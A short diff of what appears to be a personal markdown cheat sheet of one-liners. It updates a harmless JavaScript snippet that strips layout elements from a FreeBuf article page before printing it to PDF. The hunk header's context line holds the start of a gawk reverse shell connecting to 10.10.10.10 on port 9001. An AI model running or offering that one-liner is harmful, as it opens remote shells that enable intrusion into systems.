@@ -95,7 +95,7 @@ awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/9001"; while(42) { do{ printf "shell>" 
 ### freebuf2pdf
 > ***2024-6-28: fb0sh***
 ```js
-["articles-layout-header ant-layout-header", "page-header", "ant-layout-footer","floating-view", "aside-left", "aside-right", "remix-module","introduce"].forEach(c => document.getElementsByClassName(c)[0].remove());window.print();
+["articles-layout-header ant-layout-header", "page-header", "ant-layout-footer","floating-view", "aside-left", "aside-right", "remix-module","introduce"].forEach(c => document.getElementsByClassName(c)[0].remove());document.getElementsByClassName("main")[0].setAttribute("style","width:100%");window.print();
 ```
 ---
 <!-- 列表尾 -->
